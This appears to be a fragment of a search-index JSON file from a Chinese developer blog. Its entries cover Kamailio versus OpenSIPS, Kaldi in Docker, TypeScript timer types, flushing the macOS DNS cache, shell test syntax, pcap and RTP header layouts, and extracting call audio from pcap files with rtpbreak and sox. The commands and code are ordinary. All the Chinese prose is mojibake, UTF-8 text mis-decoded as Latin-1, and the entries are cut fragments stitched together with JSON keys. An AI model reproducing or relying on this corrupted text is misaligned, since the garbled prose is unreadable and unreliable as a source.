https://www.kamailio.org/wiki/cookbooks/5.5.x/core çš„defineéƒ¨åˆ† ä»£ç è´¨é‡ä¸Š æˆ‘è§‰å¾—ä¹Ÿæ˜¯kaimailioä¹Ÿæ˜¯æ›´èƒœä¸€ç­¹ï¼Œè‡³å°‘kamailiooè¿˜åšäº†cçš„å•å…ƒæµ‹è¯• æ€»ä½“è€Œè¨€ï¼Œå¦‚æœä½ è¦æ˜¯ç¬¬ä¸€æ¬¡æ¥é€‰æ‹©ï¼Œæˆ‘æ›´å¸Œæœ›ä½ ç”¨kamailioä½œä¸ºsipæœåŠ¡å™¨ã€‚æˆ‘ä¹‹æ‰€ä»¥ç”¨OpenSIPSåªä¸è¿‡æ˜¯è·¯å¾„ä¾èµ–è€Œå·²ã€‚\nä½†æ˜¯å¦‚æœä½ å­¦ä¼šäº†OpenSIPS, é‚£ä½ å­¦ä¹ kamailioå°±ä¼šéå¸¸è½»æ¾ã€‚\nå‚è€ƒ https://weekly-geekly.github.io/articles/150280/index.html https://github.com/kamailio/kamailio https://www.kamailio.org/wiki/ ","permalink":"https://wdd.js.org/opensips/tools/kamailio/","summary":"ä¹‹å‰æˆ‘å†™è¿‡OpenSIPSçš„æ–‡ç« ï¼Œæ‰€ä»¥åœ¨å­¦ä¹ Kamailioæ˜¯ï¼Œä¼šå°è¯•å’ŒOpenSIPSåšå¯¹æ¯”ã€‚\nä»ä¸‹å›¾å¯ä»¥çœ‹å‡ºï¼ŒKamailioå’ŒOpensipsç®—æ˜¯åŒæ ¹åŒæºäº†ã€‚å¾ˆå¤šè¯­æ³•ã€ä¼ªå˜é‡ã€æ¨¡å—ä½¿ç”¨æ–¹å¼ï¼Œä¸¤è€…éƒ½æä¸ºç›¸ä¼¼ã€‚\nä¸ä¸€æ ·çš„ç‚¹ ç„¶è€Œæ€»ä½“æ¥è¯´ï¼Œkamailioç›¸æ¯”OpenSIPSï¼Œæ›´åŠ çµæ´»ã€‚ å¦‚æœæœ‰æœºä¼šï¼Œå°è¯•ä¸‹kamailioä¹Ÿæœªå°ä¸å¯ã€‚è€Œä¸”kamailioçš„git startæ•°é‡æ¯”OpenSIPSå¤šå¾ˆå¤šï¼Œè€Œä¸”issueä¹Ÿæ¯”OpenSIPSå°‘ã€‚\nKamailio æœ‰wikiç¤¾åŒºï¼Œæ³¨å†Œä¹‹åï¼Œå¯ä»¥æ¥ç¼–è¾‘æ–‡æ¡£ï¼Œç›¸æ¯”äºOpenSIPSåªæœ‰å®˜æ–¹æ–‡æ¡£ï¼Œkamailioæ˜¾å¾—æ›´å®¹æ˜“è®©äººäº²è¿‘ï¼Œæé«˜äº†ç”¨æˆ·çš„å‚ä¸åº¦ã€‚ è„šæœ¬ä¸Š kamailioæ”¯æŒä¸‰ç§ä¸åŒçš„æ³¨é‡Šé£æ ¼ï¼Œopensipsåªæ”¯æŒä¸€ç§ kamailioæ”¯æŒç±»ä¼¼cè¯­è¨€çš„å®å®šä¹‰çš„æ–¹å¼å†™è„šæœ¬ï¼Œå› è€Œkamailioçš„è„šæœ¬å¯ä»¥ä¸å€ŸåŠ©å¤–éƒ¨å·¥å…·çš„æƒ…å†µä¸‹ï¼Œå†™çš„éå¸¸çµæ´»ã€‚å¯ä»¥å‚è€ƒ https://www.kamailio.org/wiki/cookbooks/5.5.x/core çš„defineéƒ¨åˆ† ä»£ç è´¨é‡ä¸Š æˆ‘è§‰å¾—ä¹Ÿæ˜¯kaimailioä¹Ÿæ˜¯æ›´èƒœä¸€ç­¹ï¼Œè‡³å°‘kamailiooè¿˜åšäº†cçš„å•å…ƒæµ‹è¯• æ€»ä½“è€Œè¨€ï¼Œå¦‚æœä½ è¦æ˜¯ç¬¬ä¸€æ¬¡æ¥é€‰æ‹©ï¼Œæˆ‘æ›´å¸Œæœ›ä½ ç”¨kamailioä½œä¸ºsipæœåŠ¡å™¨ã€‚æˆ‘ä¹‹æ‰€ä»¥ç”¨OpenSIPSåªä¸è¿‡æ˜¯è·¯å¾„ä¾èµ–è€Œå·²ã€‚\nä½†æ˜¯å¦‚æœä½ å­¦ä¼šäº†OpenSIPS, é‚£ä½ å­¦ä¹ kamailioå°±ä¼šéå¸¸è½»æ¾ã€‚\nå‚è€ƒ https://weekly-geekly.github.io/articles/150280/index.html https://github.com/kamailio/kamailio https://www.kamailio.org/wiki/ ","title":"å¦ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„sip server: kamailio"},{"content":"ä¸ºäº†çœå»å®‰è£…çš„éº»çƒ¦ï¼Œæˆ‘ç›´æ¥ä½¿ç”¨çš„æ˜¯å®¹å™¨ç‰ˆæœ¬çš„kaldi\nhttps://hub.docker.com/r/kaldiasr/kaldi\ndocker pull kaldiasr/kaldi This is the official Docker Hub of the Kaldi project: http://kaldi-asr.org Kaldi offers two sets of images: CPU-based images and GPU-based images. Daily builds of the latest version of the master branch (both CPU and GPU images) are pushed to DockerHub. Sample usage of the CPU based images: docker run -it kaldiasr/kaldi:latest Sample usage of the GPU based images: Note: use nvidia-docker to run the GPU images. docker run -it --runtime=nvidia kaldiasr/kaldi:gpu-latest Please refer to Kaldi\u0026#39;s GitHub repository for more details. kaldiasr/kaldiè¿™ä¸ªé•œåƒæ˜¯åŸºäºlinuxkitæ„å»ºçš„ï¼Œå¦‚æœç¼ºå°‘ä»€ä¹ˆåŒ…ï¼Œå¯ä»¥ä½¿ç”¨aptå‘½ä»¤åœ¨å®¹å™¨ä¸­å®‰è£…\nå®‰è£…oymyzsh å› ä¸ºæˆ‘æ¯”è¾ƒå–œæ¬¢ç”¨ohmyzsh, æ‰€ä»¥å³ä½¿åœ¨å®¹å™¨é‡Œï¼Œæˆ‘ä¹Ÿæƒ³å®‰è£…è¿™ä¸ªå·¥å…·\napt install zsh curl ","permalink":"https://wdd.js.org/posts/2020/05/haowe5/","summary":"ä¸ºäº†çœå»å®‰è£…çš„éº»çƒ¦ï¼Œæˆ‘ç›´æ¥ä½¿ç”¨çš„æ˜¯å®¹å™¨ç‰ˆæœ¬çš„kaldi\nhttps://hub.docker.com/r/kaldiasr/kaldi\ndocker pull kaldiasr/kaldi This is the official Docker Hub of the Kaldi project: http://kaldi-asr.org Kaldi offers two sets of images: CPU-based images and GPU-based images. Daily builds of the latest version of the master branch (both CPU and GPU images) are pushed to DockerHub. Sample usage of the CPU based images: docker run -it kaldiasr/kaldi:latest Sample usage of the GPU based images: Note: use nvidia-docker to run the GPU images.","title":"kaldiå®‰è£…"},{"content":"let timer:NodeJS.Timer; timer = global.setTimeout(myFunction, 1000); å‚è€ƒhttp://evanshortiss.com/development/nodejs/typescript/2016/11/16/timers-in-typescript.html\n","permalink":"https://wdd.js.org/posts/2020/05/uwe59t/","summary":"let timer:NodeJS.Timer; timer = global.setTimeout(myFunction, 1000); å‚è€ƒhttp://evanshortiss.com/development/nodejs/typescript/2016/11/16/timers-in-typescript.html","title":"Type 'Timeout' is not assignable to type 'number'"},{"content":"sudo killall -HUP mDNSResponder ","permalink":"https://wdd.js.org/posts/2020/05/gy02f8/","summary":"sudo killall -HUP mDNSResponder ","title":"macbook æ¸…ç©ºDNSç¼“å­˜"},{"content":"if # if if condition; then commands; fi # if else if if condition; then commands; elif condition; then commands; else commands; fi ç®€å•ç‰ˆæœ¬çš„ if æµ‹è¯•\n[ condtion ] \u0026amp;\u0026amp; action; [ conditio ] || action; ç®—æ•°æ¯”è¾ƒ [ $var -eq 0 ] #å½“varç­‰äº0 [ $var -ne 0 ] #å½“varä¸ç­‰äº0 -gt å¤§äº -lt å°äº -ge å¤§äºæˆ–ç­‰äº -le å°äºæˆ–ç­‰äº ä½¿ç”¨-a, -o å¯ä»¥ç»„åˆå¤æ‚çš„æµ‹è¯•ã€‚\n[ $var -ne 0 -a $var -gt 2 ] # -aç›¸å½“äºå¹¶ä¸” [ $var -ne 0 -o $var -gt 2 ] # -oç›¸å½“äºæˆ– æ–‡ä»¶æ¯”è¾ƒ [ -f $file ] # å¦‚æœfileæ˜¯å­˜åœ¨çš„æ–‡ä»¶è·¯å¾„æˆ–è€…æ–‡ä»¶åï¼Œåˆ™è¿”å›çœŸ -f æµ‹è¯•æ–‡ä»¶è·¯å¾„æˆ–è€…æ–‡ä»¶æ˜¯å¦å­˜åœ¨ -x æµ‹è¯•æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œ -e æµ‹è¯•æ–‡ä»¶æ˜¯å¦å­˜åœ¨ -c æµ‹è¯•æ–‡ä»¶æ˜¯å¦æ˜¯å­—ç¬¦è®¾å¤‡ -b æµ‹è¯•æ–‡ä»¶æ˜¯å¦æ˜¯å—è®¾å¤‡ -w æµ‹è¯•æ–‡ä»¶æ˜¯å¦å¯å†™ -r æµ‹è¯•æ–‡ä»¶æ˜¯å¦å¯è¯» -L æµ‹è¯•æ–‡ä»¶æ˜¯å¦æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ å­—ç¬¦ä¸²æ¯”è¾ƒ å­—ç¬¦ä¸²æ¯”è¾ƒä¸€å®šè¦ç”¨åŒä¸­æ‹¬å·ã€‚\n[[ $str1 == $str2 ]] # æµ‹è¯•å­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ [[ $str1 != $str2 ]] # æµ‹è¯•å­—ç¬¦ä¸²æ˜¯å¦ä¸ç›¸ç­‰ [[ $str1 \u0026gt; $str2 ]] # æµ‹è¯•str1å­—ç¬¦åºå·æ¯”str2å¤§ [[ $str1 \u0026lt; $str2 ]] # æµ‹è¯•str1å­—ç¬¦åºå·æ¯”str2å° [[ -z $str ]] # æµ‹è¯•stræ˜¯å¦æ˜¯ç©ºå­—ç¬¦ä¸² [[ -n $str ]] # æµ‹è¯•stræ˜¯å¦æ˜¯éç©ºå­—ç¬¦ä¸² if å’Œ[ä¹‹é—´å¿…é¡»åŒ…å«æœ‰ä¸€ä¸ªç©ºæ ¼ # ok if [[ $1 == $2 ]]; then echo hello fi # error if[[ $1 == $2 ]]; then echo hello fi ","permalink":"https://wdd.js.org/shell/cond-test/","summary":"if # if if condition; then commands; fi # if else if if condition; then commands; elif condition; then commands; else commands; fi ç®€å•ç‰ˆæœ¬çš„ if æµ‹è¯•\n[ condtion ] \u0026amp;\u0026amp; action; [ conditio ] || action; ç®—æ•°æ¯”è¾ƒ [ $var -eq 0 ] #å½“varç­‰äº0 [ $var -ne 0 ] #å½“varä¸ç­‰äº0 -gt å¤§äº -lt å°äº -ge å¤§äºæˆ–ç­‰äº -le å°äºæˆ–ç­‰äº ä½¿ç”¨-a, -o å¯ä»¥ç»„åˆå¤æ‚çš„æµ‹è¯•ã€‚\n[ $var -ne 0 -a $var -gt 2 ] # -aç›¸å½“äºå¹¶ä¸” [ $var -ne 0 -o $var -gt 2 ] # -oç›¸å½“äºæˆ– æ–‡ä»¶æ¯”è¾ƒ [ -f $file ] # å¦‚æœfileæ˜¯å­˜åœ¨çš„æ–‡ä»¶è·¯å¾„æˆ–è€…æ–‡ä»¶åï¼Œåˆ™è¿”å›çœŸ -f æµ‹è¯•æ–‡ä»¶è·¯å¾„æˆ–è€…æ–‡ä»¶æ˜¯å¦å­˜åœ¨ -x æµ‹è¯•æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œ -e æµ‹è¯•æ–‡ä»¶æ˜¯å¦å­˜åœ¨ -c æµ‹è¯•æ–‡ä»¶æ˜¯å¦æ˜¯å­—ç¬¦è®¾å¤‡ -b æµ‹è¯•æ–‡ä»¶æ˜¯å¦æ˜¯å—è®¾å¤‡ -w æµ‹è¯•æ–‡ä»¶æ˜¯å¦å¯å†™ -r æµ‹è¯•æ–‡ä»¶æ˜¯å¦å¯è¯» -L æµ‹è¯•æ–‡ä»¶æ˜¯å¦æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ å­—ç¬¦ä¸²æ¯”è¾ƒ å­—ç¬¦ä¸²æ¯”è¾ƒä¸€å®šè¦ç”¨åŒä¸­æ‹¬å·ã€‚","title":"æ¯”è¾ƒä¸æµ‹è¯•"},{"content":"","permalink":"https://wdd.js.org/posts/2020/05/db6ou6/","summary":"","title":"xmppå­¦ä¹ "},{"content":"ä»‹ç» ä¹‹æ‰€ä»¥è¦å†™è¿™ç¯‡æ–‡ç« ï¼Œæ˜¯å› ä¸ºæˆ‘è¦ä»pcapæ ¼å¼çš„æŠ“åŒ…æ–‡ä»¶ä¸­æŠ½å–å‡ºè¯­éŸ³æ–‡ä»¶ã€‚ä¹‹é—´è™½ç„¶å¯¹tcpåè®®æœ‰ä¸é”™çš„ç†è§£ï¼Œä½†å¹¶æ²¡æœ‰å†™ä»£ç å»çœŸæ­£çš„è§£åŒ…åˆ†æã€‚\næœ€è¿‘ç”¨Node.jså°è¯•å»pacpæ–‡ä»¶ä¸­æˆåŠŸæå–å‡ºäº†è¯­éŸ³æ–‡ä»¶ã€‚å†æ¬¡åšä¸ªæ€»ç»“ã€‚\né¢„å¤‡çŸ¥è¯† å­—èŠ‚åºï¼š å…³äºå­—èŠ‚åºï¼Œå¯ä»¥å‚è€ƒÂ https://www.ruanyifeng.com/blog/2016/11/byte-order.htmlã€‚è¯»å–çš„æ—¶å€™ï¼Œå¦‚æœå­—èŠ‚åºè®¾ç½®é”™äº†ï¼Œå°±ä¼šè¯»å‡ºæ¥ä¸€å †æ— æ³•è§£æçš„å†…å®¹ PCAPæ ¼å¼ ä¸‹é¢æ˜¯paapæ–‡ä»¶çš„æ ¼å¼ã€‚\nå¼€å±€æ˜¯ä¸€ä¸ªå…¨å±€çš„å¤´æ–‡ä»¶ã€‚åç»­è·Ÿç€ä¸€ç³»åˆ—çš„åŒ…å¤´å’ŒåŒ…ä½“ã€‚\nGlobal Headeræ ¼å¼ å…¨å±€å¤´ç”±å…­ä¸ªå­—æ®µç»„æˆï¼ŒåŠ èµ·æ¥ä¸€å…±24ä¸ªå­—èŠ‚ã€‚\ntypedef struct pcap_hdr_s { guint32 magic_number; /* magic number */ guint16 version_major; /* major version number */ guint16 version_minor; /* minor version number */ gint32 thiszone; /* GMT to local correction */ guint32 sigfigs; /* accuracy of timestamps */ guint32 snaplen; /* max length of captured packets, in octets */ guint32 network; /* data link type */ } pcap_hdr_t; magic_number é­”æœ¯å­—ç¬¦ï¼Œ32ä½æ— ç¬¦å·æ•´å‹ï¼Œä¸€èˆ¬æ˜¯0xa1b2c3d4æˆ–è€…0xd4c3b2a1ï¼Œå‰è€…è¡¨ç¤ºå­—æ®µè¦æŒ‰ç…§å¤§ç«¯å­—èŠ‚åºæ¥è¯»å–ï¼Œåè€…è¡¨ç¤ºå­—æ®µè¦æŒ‰ç…§å°æ®µå­—èŠ‚åºæ¥è¯»å–ã€‚ version_major å¤§ç‰ˆæœ¬å·ï¼Œ16ä½æ— ç¬¦å·æ•´å½¢ã€‚ä¸€èˆ¬æ˜¯2 version_minor å°ç‰ˆæœ¬å·ï¼Œ16ä½æ— ç¬¦å·æ•´å½¢ã€‚ä¸€èˆ¬æ˜¯4 thiszone æ—¶åŒº sigfigs å®é™…æ—¶é—´æˆ³ snaplen æ•è·çš„æœ€å¤§çš„é•¿åº¦ network æ•°æ®é“¾è·¯å±‚çš„ç±»å‹ã€‚å‚è€ƒhttp://www.tcpdump.org/linktypes.htmlï¼Œ å¸¸è§çš„1å°±æ˜¯è¡¨ç¤ºIEEE 802.3 Packet Header å½“è¯»å–äº†pcapæ–‡ä»¶çš„å‰24ä¸ªå­—èŠ‚ä¹‹åï¼Œç´§æ¥ç€éœ€è¦è¯»å–16ä¸ªå­—èŠ‚ã€‚è¿™16ä¸ªå­—èŠ‚ä¸­ï¼Œincl_lenè¡¨ç¤ºpacketæ•°æ®éƒ¨åˆ†çš„é•¿åº¦ã€‚å½“æ‹¿åˆ°äº†Packet Dataéƒ¨åˆ†æ•°æ®çš„é•¿åº¦ã€‚æˆ‘ä»¬åŒæ—¶ä¹Ÿå°±çŸ¥é“äº†ä¸‹ä¸€ä¸ªpacket headerè¦ä»å“ªä¸ªä½ç½®å¼€å§‹è¯»å–ã€‚\ntypedef struct pcaprec_hdr_s { guint32 ts_sec; /* timestamp seconds */ guint32 ts_usec; /* timestamp microseconds */ guint32 incl_len; /* number of octets of packet saved in file */ guint32 orig_len; /* actual length of packet */ } pcaprec_hdr_t; Packet Data packet dataéƒ¨åˆ†æ˜¯é“¾è·¯å±‚çš„æ•°æ®ï¼Œç”±global headerçš„networkç±»å‹å»å†³å®šï¼Œä¸€èˆ¬å¯èƒ½æ˜¯802.3çš„æ¯”è¾ƒå¤šã€‚\nIEEE 802.3 å½“æ‹¿åˆ°packet dataéƒ¨åˆ†çš„æ•°æ®ä¹‹åã€‚å‚è€ƒframeçš„æ ¼å¼ã€‚ä¸€èˆ¬Perambleå­—æ®µéƒ¨åˆ†æ˜¯æ²¡æœ‰çš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠåŒ…çš„æ€»é•¿åº¦å‡å»14å­—èŠ‚ä¹‹åï¼Œæ‹¿åˆ°User Dataéƒ¨åˆ†çš„æ•°æ®ã€‚\nå…¶ä¸­Type/Lengthéƒ¨åˆ†å¯ä»¥è¯´æ˜ä¸Šå±‚è¿è½½çš„æ˜¯ä»€ä¹ˆåè®®çš„åŒ…ï¼Œæ¯”è¾ƒå¸¸è§çš„æ˜¯0x0800è¡¨ç¤ºä¸Šå±‚æ˜¯IPv4, 0x86ddè¡¨ç¤ºä¸Šå±‚æ˜¯IPv6\n0 - 1500 length field (IEEE 802.3 and/or 802.2) 0x0800 IP(v4), Internet Protocol version 4 0x0806 ARP, Address Resolution Protocol 0x8137 IPX, Internet Packet eXchange (Novell) 0x86dd IPv6, Internet Protocol version 6 802.3çš„è¯¦æƒ…å¯ä»¥å‚è€ƒÂ https://wiki.wireshark.org/Ethernet?action=show\u0026amp;redirect=Protocols%2Feth\nIPåŒ…çš„å°è£…æ ¼å¼ å¦‚ä½•è®¡ç®—IPæ•°æ®éƒ¨åˆ†çš„é•¿åº¦å‘¢ï¼Ÿéœ€è¦çŸ¥é“ä¸¤ä¸ªå­—æ®µçš„å€¼ã€‚\nTotol Length: IPæ•°æ®æŠ¥çš„æ€»é•¿åº¦ï¼Œå•ä½æ˜¯å­—èŠ‚ IHL: IPæ•°æ®æŠ¥å¤´éƒ¨çš„æ€»é•¿åº¦ï¼Œå•ä½æ˜¯4å­—èŠ‚ã€‚IHLæ¯”è¾ƒå¸¸è§çš„å€¼æ˜¯5ï¼Œåˆ™è¯´å‘½åIPæ•°æ®å¤´éƒ¨çš„é•¿åº¦æ˜¯20å­—èŠ‚ã€‚IHLå 4ä½ï¼Œæœ€å¤§æ˜¯15ï¼Œæ‰€ä»¥IPå¤´çš„æœ€å¤§é•¿åº¦æ˜¯60å­—èŠ‚(15 * 4) dataéƒ¨åˆ†çš„å­—èŠ‚é•¿åº¦ = Total Length - IHL * 4\nTCPåŒ…çš„å°è£…æ ¼å¼ UDPåŒ…çš„å°è£…æ ¼å¼ UDPåŒ…çš„å¤´éƒ¨æ˜¯å®šé•¿çš„8ä¸ªå­—èŠ‚ã€‚æ•°æ®éƒ¨åˆ†çš„é•¿åº¦ = æ€»é•¿åº¦ - 8\nRTPåŒ…çš„å°è£…æ ¼å¼ RTPåŒ…çš„æ•°æ®éƒ¨åˆ†é•¿åº¦ = æ€»é•¿åº¦ - 12\nPTéƒ¨åˆ†è¡¨ç¤ºç¼–ç æ ¼å¼ï¼Œä¾‹å¦‚å¸¸è§çš„PCMUæ˜¯0ï¼Œ\nRTPè¯¦æƒ…Â https://www.ietf.org/rfc/rfc3550.txtRTPæ•°æ®ä½“ç±»å‹ç¼–ç è¡¨å‚è€ƒÂ https://www.ietf.org/rfc/rfc3551.txt\nå‚è€ƒ http://www.tcpdump.org/linktypes.html https://wiki.wireshark.org/Development/LibpcapFileFormat ","permalink":"https://wdd.js.org/network/gzskun/","summary":"ä»‹ç» ä¹‹æ‰€ä»¥è¦å†™è¿™ç¯‡æ–‡ç« ï¼Œæ˜¯å› ä¸ºæˆ‘è¦ä»pcapæ ¼å¼çš„æŠ“åŒ…æ–‡ä»¶ä¸­æŠ½å–å‡ºè¯­éŸ³æ–‡ä»¶ã€‚ä¹‹é—´è™½ç„¶å¯¹tcpåè®®æœ‰ä¸é”™çš„ç†è§£ï¼Œä½†å¹¶æ²¡æœ‰å†™ä»£ç å»çœŸæ­£çš„è§£åŒ…åˆ†æã€‚\næœ€è¿‘ç”¨Node.jså°è¯•å»pacpæ–‡ä»¶ä¸­æˆåŠŸæå–å‡ºäº†è¯­éŸ³æ–‡ä»¶ã€‚å†æ¬¡åšä¸ªæ€»ç»“ã€‚\né¢„å¤‡çŸ¥è¯† å­—èŠ‚åºï¼š å…³äºå­—èŠ‚åºï¼Œå¯ä»¥å‚è€ƒÂ https://www.ruanyifeng.com/blog/2016/11/byte-order.htmlã€‚è¯»å–çš„æ—¶å€™ï¼Œå¦‚æœå­—èŠ‚åºè®¾ç½®é”™äº†ï¼Œå°±ä¼šè¯»å‡ºæ¥ä¸€å †æ— æ³•è§£æçš„å†…å®¹ PCAPæ ¼å¼ ä¸‹é¢æ˜¯paapæ–‡ä»¶çš„æ ¼å¼ã€‚\nå¼€å±€æ˜¯ä¸€ä¸ªå…¨å±€çš„å¤´æ–‡ä»¶ã€‚åç»­è·Ÿç€ä¸€ç³»åˆ—çš„åŒ…å¤´å’ŒåŒ…ä½“ã€‚\nGlobal Headeræ ¼å¼ å…¨å±€å¤´ç”±å…­ä¸ªå­—æ®µç»„æˆï¼ŒåŠ èµ·æ¥ä¸€å…±24ä¸ªå­—èŠ‚ã€‚\ntypedef struct pcap_hdr_s { guint32 magic_number; /* magic number */ guint16 version_major; /* major version number */ guint16 version_minor; /* minor version number */ gint32 thiszone; /* GMT to local correction */ guint32 sigfigs; /* accuracy of timestamps */ guint32 snaplen; /* max length of captured packets, in octets */ guint32 network; /* data link type */ } pcap_hdr_t; magic_number é­”æœ¯å­—ç¬¦ï¼Œ32ä½æ— ç¬¦å·æ•´å‹ï¼Œä¸€èˆ¬æ˜¯0xa1b2c3d4æˆ–è€…0xd4c3b2a1ï¼Œå‰è€…è¡¨ç¤ºå­—æ®µè¦æŒ‰ç…§å¤§ç«¯å­—èŠ‚åºæ¥è¯»å–ï¼Œåè€…è¡¨ç¤ºå­—æ®µè¦æŒ‰ç…§å°æ®µå­—èŠ‚åºæ¥è¯»å–ã€‚ version_major å¤§ç‰ˆæœ¬å·ï¼Œ16ä½æ— ç¬¦å·æ•´å½¢ã€‚ä¸€èˆ¬æ˜¯2 version_minor å°ç‰ˆæœ¬å·ï¼Œ16ä½æ— ç¬¦å·æ•´å½¢ã€‚ä¸€èˆ¬æ˜¯4 thiszone æ—¶åŒº sigfigs å®é™…æ—¶é—´æˆ³ snaplen æ•è·çš„æœ€å¤§çš„é•¿åº¦ network æ•°æ®é“¾è·¯å±‚çš„ç±»å‹ã€‚å‚è€ƒhttp://www.","title":"ç½‘ç»œæ‹†åŒ…ç¬”è®°"},{"content":"wiresharkå…·æœ‰è¿™ä¸ªåŠŸèƒ½ï¼Œä½†æ˜¯å¹¶ä¸é€‚åˆåšæ‰¹é‡æ‰§è¡Œã€‚\nä¸‹é¢çš„æ–¹æ¡ˆæ¯”è¾ƒé€‚åˆæ‰¹é‡æ‰§è¡Œã€‚\n# 1. å®‰è£…ä¾èµ– yum install gcc libpcap-devel libnet-devel sox -y # 2. å…‹éš†æºç  git clone https://github.com/wangduanduan/rtpsplit.git # 3. åˆ‡æ¢ç›®å½• cd rtpsplit # 4. ç¼–è¯‘å¯æ‰§è¡Œæ–‡ä»¶ make # 5. å°†å¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶åˆ°/usr/local/binç›®å½•ä¸‹ cp src/rtpbreak /usr/local/bin # 6. åˆ‡æ¢åˆ°å½•éŸ³æ–‡ä»¶çš„ç›®å½•ï¼Œå‡å¦‚å½“å‰ç›®å½•åªæœ‰ä¸€ä¸ªæ–‡ä»¶ rtpbreak -r krk9hprvin1u1laqe14g-8beffe8aaeb9bf99.pcap -g -m -d ./ audio git:(edge) âœ— rtpbreak -r krk9hprvin1u1laqe14g-8beffe8aaeb9bf99.pcap -g -m -d ./ + rtpbreak v1.3a running here! + pid: 1885, date/time: 01/05/2020#09:49:05 + Configuration + INPUT Packet source: rxfile \u0026#39;krk9hprvin1u1laqe14g-8beffe8aaeb9bf99.pcap\u0026#39; Force datalink header length: disabled + OUTPUT Output directory: \u0026#39;./\u0026#39; RTP raw dumps: enabled RTP pcap dumps: enabled Fill gaps: enabled Dump noise: disabled Logfile: \u0026#39;.//rtp.0.txt\u0026#39; Logging to stdout: enabled Logging to syslog: disabled Be verbose: disabled + SELECT Sniff packets in promisc mode: enabled Add pcap filter: disabled Expecting even destination UDP port: disabled Expecting unprivileged source/destination UDP ports: disabled Expecting RTP payload type: any Expecting RTP payload length: any Packet timeout: 10.00 seconds Pattern timeout: 0.25 seconds Pattern packets: 5 + EXECUTION Running as user/group: root/root Running daemonized: disabled * You can dump stats sending me a SIGUSR2 signal * Reading packets... open di .//rtp.0.0.txt ! [rtp0] detected: pt=0(g711U) 192.168.40.192:26396 =\u0026gt; 192.168.60.229:20000 open di .//rtp.0.1.txt ! [rtp1] detected: pt=0(g711U) 10.197.169.10:49265 =\u0026gt; 192.168.60.229:20012 * eof reached. -- Caught SIGTERM signal (15), cleaning up... -- * [rtp1] closed: packets inbuffer=0 flushed=285 lost=0(0.00%), call_length=0m12s * [rtp0] closed: packets inbuffer=0 flushed=586 lost=0(0.00%), call_length=0m12s + Status Alive RTP Sessions: 0 Closed RTP Sessions: 2 Detected RTP Sessions: 2 Flushed RTP packets: 871 Lost RTP packets: 0 (0.00%) Noise (false positive) packets: 8 + No active RTP streams # 7. æŸ¥çœ‹è¾“å‡ºæ–‡ä»¶ -rw-r--r--. 1 root root 185K May 1 09:22 krk9hprvin1u1laqe14g-8beffe8aaeb9bf99.pcap -rw-r--r--. 1 root root 132K May 1 09:49 rtp.0.0.pcap -rw-r--r--. 1 root root 92K May 1 09:49 rtp.0.0.raw -rw-r--r--. 1 root root 412 May 1 09:49 rtp.0.0.txt -rw-r--r--. 1 root root 52K May 1 09:49 rtp.0.1.pcap -rw-r--r--. 1 root root 33K May 1 09:49 rtp.0.1.raw -rw-r--r--. 1 root root 435 May 1 09:49 rtp.0.1.txt -rw-r--r--. 1 root root 1.7K May 1 09:49 rtp.0.txt # 8. ä½¿ç”¨sox è½¬ç ä»¥åŠåˆæˆwavæ–‡ä»¶ sox -r8000 -c1 -t ul rtp.0.0.raw -t wav 0.wav sox -r8000 -c1 -t ul rtp.0.1.raw -t wav 1.wav sox -m 0.wav 1.wav call.wav # æœ€ç»ˆåˆæˆçš„ call.wavæ–‡ä»¶ï¼Œå°±æ˜¯å¯ä»¥æ”¾åˆ°æµè§ˆå™¨ä¸­æ’­æ”¾çš„åŒå£°é“è¯­éŸ³æ–‡ä»¶ å‚è€ƒ rtpbreakå¸®åŠ©æ–‡æ¡£ Copyright (c) 2007-2008 Dallachiesa Michele \u0026lt;micheleDOTdallachiesaATposteDOTit\u0026gt; rtpbreak v1.3a is free software, covered by the GNU General Public License. USAGE: rtpbreak (-r|-i) \u0026lt;source\u0026gt; [options] INPUT -r \u0026lt;str\u0026gt; Read packets from pcap file \u0026lt;str\u0026gt; -i \u0026lt;str\u0026gt; Read packets from network interface \u0026lt;str\u0026gt; -L \u0026lt;int\u0026gt; Force datalink header length == \u0026lt;int\u0026gt; bytes OUTPUT -d \u0026lt;str\u0026gt; Set output directory to \u0026lt;str\u0026gt; (def:.) -w Disable RTP raw dumps -W Disable RTP pcap dumps -g Fill gaps in RTP raw dumps (caused by lost packets) -n Dump noise packets -f Disable stdout logging -F Enable syslog logging -v Be verbose SELECT -m Sniff packets in promisc mode -p \u0026lt;str\u0026gt; Add pcap filter \u0026lt;str\u0026gt; -e Expect even destination UDP port -u Expect unprivileged source/destination UDP ports (\u0026gt;1024) -y \u0026lt;int\u0026gt; Expect RTP payload type == \u0026lt;int\u0026gt; -l \u0026lt;int\u0026gt; Expect RTP payload length == \u0026lt;int\u0026gt; bytes -t \u0026lt;float\u0026gt; Set packet timeout to \u0026lt;float\u0026gt; seconds (def:10.00) -T \u0026lt;float\u0026gt; Set pattern timeout to \u0026lt;float\u0026gt; seconds (def:0.25) -P \u0026lt;int\u0026gt; Set pattern packets count to \u0026lt;int\u0026gt; (def:5) EXECUTION -Z \u0026lt;str\u0026gt; Run as user \u0026lt;str\u0026gt; -D Run in background (option -f implicit) MISC -k List known RTP payload types -h This ","permalink":"https://wdd.js.org/posts/2020/05/fosfbg/","summary":"wiresharkå…·æœ‰è¿™ä¸ªåŠŸèƒ½ï¼Œä½†æ˜¯å¹¶ä¸é€‚åˆåšæ‰¹é‡æ‰§è¡Œã€‚\nä¸‹é¢çš„æ–¹æ¡ˆæ¯”è¾ƒé€‚åˆæ‰¹é‡æ‰§è¡Œã€‚\n# 1. å®‰è£…ä¾èµ– yum install gcc libpcap-devel libnet-devel sox -y # 2. å…‹éš†æºç  git clone https://github.com/wangduanduan/rtpsplit.git # 3. åˆ‡æ¢ç›®å½• cd rtpsplit # 4. ç¼–è¯‘å¯æ‰§è¡Œæ–‡ä»¶ make # 5. å°†å¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶åˆ°/usr/local/binç›®å½•ä¸‹ cp src/rtpbreak /usr/local/bin # 6. åˆ‡æ¢åˆ°å½•éŸ³æ–‡ä»¶çš„ç›®å½•ï¼Œå‡å¦‚å½“å‰ç›®å½•åªæœ‰ä¸€ä¸ªæ–‡ä»¶ rtpbreak -r krk9hprvin1u1laqe14g-8beffe8aaeb9bf99.pcap -g -m -d ./ audio 